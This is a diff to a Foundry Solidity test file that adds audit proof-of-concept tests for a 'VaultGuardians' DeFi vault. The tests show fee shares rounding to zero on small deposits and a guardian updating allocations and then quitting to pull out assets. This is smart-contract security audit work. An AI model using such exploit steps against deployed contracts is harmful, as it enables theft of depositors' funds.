@@ -429,7 +429,7 @@ contract VaultGuardiansBaseTest is Base_Test {
         console2.log("assetsRecovered: ", assetsRecovered); //200.279951279549527148
     }
 
-    //@audit-poc Guardian can manipulate the allocatio data based off the profits he wants to make before quitting
+    //@audit-poc Guardian can manipulate the allocatio data based off the profits they want to make before quitting
     function testUpdateAllocationWithGuradianQuittingCanCauseDOSOnWithdrawals() external hasGuardian hasTokenGuardian {
         //guardian has made a deposit by becoming a token guardian
         //user has made the deposit as well
@@ -625,6 +625,55 @@ contract VaultGuardiansBaseTest is Base_Test {
         wethVaultShares.deposit(assetsToInvest, user);
         vm.stopPrank();
         assertLt(actualAssetsToInvest, assetsToInvest);
+    }
 
+    //@audit-poc
+    function testPrecisionLossDueToSmallDeposits() external {
+        AllocationData memory allocationDataNew = AllocationData(1000, 0, 0);
+
+        weth.mint(mintAmount, guardian);
+        vm.startPrank(guardian);
+        weth.approve(address(vaultGuardians), mintAmount);
+        address wethVault = vaultGuardians.becomeGuardian(allocationDataNew);
+        wethVaultShares = VaultShares(wethVault);
+        vm.stopPrank();
+        
+        uint256 amountToInvest = 899;
+        weth.mint(amountToInvest, user);
+        vm.startPrank(user);
+        weth.approve(address(wethVaultShares), amountToInvest);
+        uint256 userShares = wethVaultShares.previewDeposit(amountToInvest);
+        uint256 feeSharesEach = userShares / wethVaultShares.getGuardianAndDaoCut();
+        uint256 feeShares = feeSharesEach * 2;
+        assertEq(feeShares, 0);
+    }
+
+    //@audit-poc
+    function testGuardianStealingByUpdatingAllocation() external hasGuardian hasTokenGuardian{
+        usdc.mint(20 ether, user);
+        vm.startPrank(user);
+        usdc.approve(address(usdcVaultShares), 20 ether);
+        VaultShares(usdcVaultShares).deposit(20 ether, user);
+        uint256 userShare = VaultShares(usdcVaultShares).balanceOf(user);
+        console2.log("userShare: ", userShare);
+        vm.stopPrank();
+
+        uint256 guardianShare = VaultShares(usdcVaultShares).balanceOf(guardian);
+        console2.log("guardianShare: ", guardianShare);
+
+        AllocationData memory allocationDataNew = AllocationData(1000, 0, 0);
+        vm.prank(guardian);
+        vaultGuardians.updateHoldingAllocation(usdc, allocationDataNew);
+
+        //before calling the quit guardian, guardian waits for enough tokens to accumulate
+        deal(address(usdc), address(usdcVaultShares), 1000 ether);
+
+
+        vm.startPrank(guardian);
+        VaultShares(usdcVaultShares).approve(address(vaultGuardians), guardianShare);
+        uint256 assetsRecovered = vaultGuardians.quitGuardian(usdc);
+        vm.stopPrank();
+
+        console2.log("assetsRecovered: ", assetsRecovered); //158.31263072845481799
     }
 }
